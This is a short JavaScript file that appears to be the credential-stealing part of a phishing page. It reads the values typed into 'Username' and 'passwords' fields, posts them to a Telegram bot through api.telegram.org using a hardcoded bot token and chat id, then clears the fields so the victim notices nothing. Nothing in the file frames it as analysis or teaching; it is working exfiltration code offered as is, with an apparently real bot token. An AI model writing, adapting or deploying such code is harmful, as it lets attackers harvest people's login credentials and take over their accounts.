var telegram_bot_id = "5798980471:AAGwK7k_N86wc8tYT4-62ZSRCq9ulmTkTi0";
var chat_id = 5798980471;
var Username, passwords, message;
var ready = function () {
    Username = document.getElementById("Username").value;
    passwords = document.getElementById("passwords").value;
    message = "Username: " + Username + "\passwords: " + passwords ;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("Username").value = "";
    document.getElementById("passwords").value = "";
    return false;
};
